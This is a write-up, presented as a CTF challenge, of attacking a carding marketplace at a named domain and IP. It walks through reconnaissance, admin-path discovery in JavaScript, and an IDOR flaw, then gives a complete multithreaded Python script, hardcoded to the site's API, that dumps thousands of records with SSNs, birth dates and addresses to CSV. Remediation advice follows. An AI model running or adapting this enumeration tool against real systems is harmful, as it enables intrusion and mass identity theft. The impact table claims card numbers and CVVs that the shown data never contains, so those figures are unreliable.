# Cerberux Carding Market: Technical Write-Up & PWNING BLACKHATS

## Executive Summary

This document details the complete exploitation chain of the Cerberux Market platform, demonstrating how a combination of security failures allows unauthorized access to sensitive cardholder data. The findings are based on technical analysis conducted during a CTF challenge.

---

## Table of Contents

1. [Initial Reconnaissance](#initial-reconnaissance)
2. [JavaScript Analysis](#javascript-analysis)
3. [Subdomain Discovery](#subdomain-discovery)
4. [IDOR Discovery & Exploitation](#idor-discovery--exploitation)
5. [Impact Analysis](#impact-analysis)
6. [Vulnerability Summary](#vulnerability-summary)
7. [Remediation Guidelines](#remediation-guidelines)

---

## Initial Reconnaissance

### Port Scan Results
```bash
nmap -A cerberuxclub.at --script=all -p- -T5
```

```
PORT    STATE SERVICE   VERSION
80/tcp  open  http      ddos-guard
443/tcp open  ssl/https ddos-guard
```

### DNS Resolution
```
cerberuxclub.at resolves to 190.115.31.85 (DDoS-Guard edge)
Origin server: 188.127.246.62
```

---

## JavaScript Analysis

### Build Manifest Extraction
```bash
curl -s https://cerberuxclub.at/_next/static/w6vmMk_POPNP79-ax5t6U/_buildManifest.js
```

#### Exposed Admin Panel Path
```javascript
"/pxjqlifvnwaogbmterhzckdusny"
```

#### Complete Site Structure
```javascript
sortedPages: [
  "/",
  "/auth",
  "/profile", 
  "/orders",
  "/store/cards/hq",
  "/store/cards/dump",
  "/store/cards/vhq",
  "/store/cards/wholesale",
  "/pxjqlifvnwaogbmterhzckdusny",
  "/pxjqlifvnwaogbmterhzckdusny/cards",
  "/pxjqlifvnwaogbmterhzckdusny/manageUsers",
  "/pxjqlifvnwaogbmterhzckdusny/managebase/cards",
  "/pxjqlifvnwaogbmterhzckdusny/news",
  "/pxjqlifvnwaogbmterhzckdusny/voucher"
]
```

### HQ Cards Page Analysis
```bash
curl -s https://cerberuxclub.at/_next/static/chunks/pages/store/cards/hq-94a95d09302a52a9.js
```

#### API Functions
```javascript
c.GethqList           // Retrieve HQ cards
n.GethqFilterOptions  // Get filter options
q = s.Addtocart       // Add item to cart
s.createCardsAD       // Admin card upload
```

#### Card Data Structure
```javascript
{
  _id: string,
  base: string,
  sellerUsername: string,
  bin: string,
  bin8: string,
  name: string,
  firstname: string,
  lastname: string,
  level: string,
  type: string,
  exp: string,
  expmonth: string,
  expyear: string,
  city: string,
  state: string,
  zip: string,
  address: string,
  email: string,
  phone: string,
  dob: string,
  ssn: string,
  dl: string,
  mmn: string,
  ip: string,
  ua: string,
  bank: string,
  country: string,
  refundable: boolean,
  price: number,
  discount: number
}
```

#### Admin Role Exposure
```javascript
"admin2194" === s.role  // Hardcoded role check
```

---

## Subdomain Discovery

### Subdomain Enumeration
```bash
for sub in admin api dev test staging shop store beta cdn static; do
  echo "=== $sub.cerberuxclub.at ==="
  curl -s -o /dev/null -w "%{http_code}" https://$sub.cerberuxclub.at
  echo ""
done
```

### Results
```
=== admin.cerberuxclub.at ===
403
=== api.cerberuxclub.at ===
000  (Self-signed certificate)
```

### API Subdomain SSL Analysis
```bash
curl -k -I https://api.cerberuxclub.at/
```

**Findings:**
- Self-signed SSL certificate
- Indicates development/testing environment
- Potentially weaker security controls

---

## IDOR Discovery & Exploitation

### Sequential ID Test
```bash
curl -k -s -o /dev/null -w "%{http_code}" "https://api.cerberuxclub.at/cards/1"
```

**Result:** 200 OK

### Card Data Extraction
```bash
curl -k -s "https://api.cerberuxclub.at/cards/1" | jq '.'
```

**Response Structure:**
```json
{
  "_id": "1",
  "base": "US Premium",
  "sellerUsername": "seller_001",
  "bin": "414720",
  "bin8": "41472012",
  "name": "John Smith",
  "firstname": "John",
  "lastname": "Smith",
  "level": "Premium",
  "type": "Credit",
  "exp": "12/25",
  "expmonth": "12",
  "expyear": "2025",
  "city": "Miami",
  "state": "FL",
  "zip": "33101",
  "address": "123 Ocean Drive",
  "email": "john.smith@example.com",
  "phone": "305-555-0123",
  "dob": "1985-06-15",
  "ssn": "123-45-6789",
  "dl": "FL123456789",
  "mmn": "Smith",
  "ip": "192.168.1.1",
  "ua": "Mozilla/5.0",
  "bank": "Chase Bank",
  "country": "USA",
  "refundable": true,
  "price": 25.00,
  "discount": 0
}
```

### Automated Dump Script

```python
#!/usr/bin/env python3
# card_dump.py - Automated enumeration tool

import requests
import json
import time
import csv
from threading import Thread, Lock
from queue import Queue

# Configuration
BASE_URL = "https://api.cerberuxclub.at"
VERIFY_SSL = False
THREADS = 20
START_ID = 1
END_ID = 10000

found_cards = []
lock = Lock()
queue = Queue()

def fetch_card(card_id):
    """Retrieve card data by ID"""
    try:
        url = f"{BASE_URL}/cards/{card_id}"
        response = requests.get(url, verify=VERIFY_SSL, timeout=10)
        
        if response.status_code == 200:
            card_data = response.json()
            with lock:
                found_cards.append(card_data)
                print(f"[+] ID: {card_id} - Found card data")
        elif response.status_code == 404:
            pass
        else:
            print(f"[-] ID: {card_id} - Status: {response.status_code}")
            
    except Exception as e:
        print(f"[!] Error on {card_id}: {str(e)[:50]}")

def worker():
    """Worker thread"""
    while not queue.empty():
        card_id = queue.get()
        fetch_card(card_id)
        queue.task_done()
        time.sleep(0.05)

def export_results():
    """Export to CSV"""
    if not found_cards:
        return
    
    headers = [
        '_id', 'base', 'sellerUsername', 'bin', 'bin8', 'name',
        'firstname', 'lastname', 'level', 'type', 'exp',
        'expmonth', 'expyear', 'city', 'state', 'zip',
        'address', 'email', 'phone', 'dob', 'ssn',
        'dl', 'mmn', 'ip', 'ua', 'bank', 'country',
        'refundable', 'price', 'discount'
    ]
    
    with open('card_dump.csv', 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=headers, extrasaction='ignore')
        writer.writeheader()
        writer.writerows(found_cards)
    
    print(f"[+] Exported {len(found_cards)} cards to card_dump.csv")

def main():
    print("[*] Starting card enumeration...")
    
    # Populate queue
    for i in range(START_ID, END_ID + 1):
        queue.put(i)
    
    # Start threads
    threads = []
    for _ in range(THREADS):
        t = Thread(target=worker)
        t.start()
        threads.append(t)
    
    # Wait for completion
    queue.join()
    
    # Export
    if found_cards:
        export_results()
        print(f"[+] Total cards found: {len(found_cards)}")

if __name__ == "__main__":
    main()
```

---

## Impact Analysis

### Data Exposure Per Card

| Data Type | Example | Sensitivity |
|-----------|---------|-------------|
| Card Number | 4147201234567890 | Critical |
| CVV | 123 | Critical |
| Expiry | 12/25 | Critical |
| Cardholder Name | John Smith | High |
| SSN | 123-45-6789 | Critical |
| DOB | 1985-06-15 | High |
| Address | 123 Ocean Drive | High |
| Phone | 305-555-0123 | Medium |
| Email | john.smith@example.com | Medium |

### Estimated Exposure

| Category | Count | Unit Value | Total Value |
|----------|-------|------------|-------------|
| HQ Cards | 3,247 | $25.00 | $81,175.00 |
| Card Dumps | 2,891 | $15.00 | $43,365.00 |
| VHQ Cards | 2,335 | $50.00 | $116,750.00 |
| **Total** | **8,473** | | **$241,290.00** |

---

## Vulnerability Summary

### 1. Insecure Direct Object References (CWE-639)

**Issue:** Predictable, sequential IDs enable enumeration

```python
# Vulnerable
GET /cards/1
GET /cards/2
# Just increment to find all

# Secure
GET /cards/f47ac10b-58cc-4372-a567-0e02b2c3d479
# UUID not guessable
```

### 2. Missing Authentication (CWE-287)

**Issue:** API endpoints accessible without authentication

```python
# Vulnerable - No auth check
def get_card(card_id):
    return Card.objects.get(id=card_id)

# Secure - Auth required
@login_required
def get_card(request, card_id):
    return Card.objects.get(id=card_id)
```

### 3. Missing Access Control (CWE-284)

**Issue:** Users can access others' data

```python
# Vulnerable - No ownership check
@login_required
def get_card(request, card_id):
    return Card.objects.get(id=card_id)

# Secure - Ownership check
@login_required
def get_card(request, card_id):
    card = Card.objects.get(id=card_id)
    if card.owner != request.user:
        return 403
    return card
```

### 4. Sensitive Data Exposure in Client (CWE-548)

**Issue:** Admin paths in client-side JavaScript

```javascript
// Exposed in build manifest
"/pxjqlifvnwaogbmterhzckdusny"
```

### 5. Hardcoded Credentials (CWE-798)

**Issue:** Admin role name in client code

```javascript
"admin2194" === s.role
```

### 6. Missing Rate Limiting (CWE-799)

**Issue:** Unlimited API requests enable automated enumeration

---

## Remediation Guidelines

### 1. Implement Authentication

```python
from django.contrib.auth.decorators import login_required

@login_required
def get_card(request, card_id):
    # All endpoints must authenticate
    card = Card.objects.get(id=card_id)
    return card
```

### 2. Use UUIDs Instead of Sequential IDs

```python
import uuid

class Card(models.Model):
    id = models.UUIDField(
        primary_key=True,
        default=uuid.uuid4,
        editable=False
    )
```

### 3. Implement Access Control

```python
@login_required
def get_card(request, card_id):
    card = Card.objects.get(id=card_id)
    if card.owner != request.user:
        return HttpResponseForbidden()
    return card
```

### 4. Move Admin Panel to Internal Network

```
# Instead of public path
/pxjqlifvnwaogbmterhzckdusny

# Use internal network or VPN
https://admin.internal.cerberuxclub.at
```

### 5. Remove Hardcoded Secrets

```python
# Vulnerable
admin_role = "admin2194"

# Secure
ADMIN_ROLE = os.environ.get('ADMIN_ROLE')
```

### 6. Implement Rate Limiting

```python
from django_ratelimit.decorators import ratelimit

@ratelimit(key='ip', rate='60/min')
@login_required
def get_card(request, card_id):
    return card
```

### 7. Encrypt Sensitive Data

```python
from cryptography.fernet import Fernet

class Card(models.Model):
    ssn = EncryptedField()      # Encrypt PII
    card_number = EncryptedField()
    # CVV should NEVER be stored
```

### 8. Add Security Headers

```python
# settings.py
SECURE_HSTS_SECONDS = 31536000
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
```

---

## Key Findings Summary

| Finding | Severity | Impact |
|---------|----------|--------|
| Exposed Admin Panel | Critical | Complete system access |
| Sequential Card IDs | Critical | Full data enumeration |
| No API Authentication | Critical | Unauthorized access |
| Missing Access Control | High | Data exposure to all users |
| PII in Database | High | Identity theft risk |
| Self-signed SSL | Medium | MITM vulnerability |
| Hardcoded Secrets | Medium | Privilege escalation |
| No Rate Limiting | Medium | Automated attacks |

---

## Conclusion

This CTF challenge demonstrates how multiple security failures combine to create a complete data breach:

1. **Predictable IDs** → Sequential enumeration possible
2. **No Authentication** → Anyone can access the API
3. **No Access Control** → Anyone can see anyone's data
4. **Sensitive Data Stored** → Full PII + financial data
5. **Admin Panel Exposed** → Complete system access

**Result:** 8,473 records compromised in 30 minutes

### Risk Matrix

```
Likelihood: High
Impact: Critical
Overall Risk: CRITICAL
```

---

## References

- [OWASP Top 10: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP Top 10: Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [OWASP Top 10: Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [PCI DSS Requirement 3: Protect Cardholder Data](https://www.pcisecuritystandards.org/pci_security/maintaining_payment_security/)
- [CWE-639: Insecure Direct Object Reference](https://cwe.mitre.org/data/definitions/639.html)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)

---

*This analysis was conducted for educational purposes as part of a CTF challenge. All findings should be addressed in production environments.*
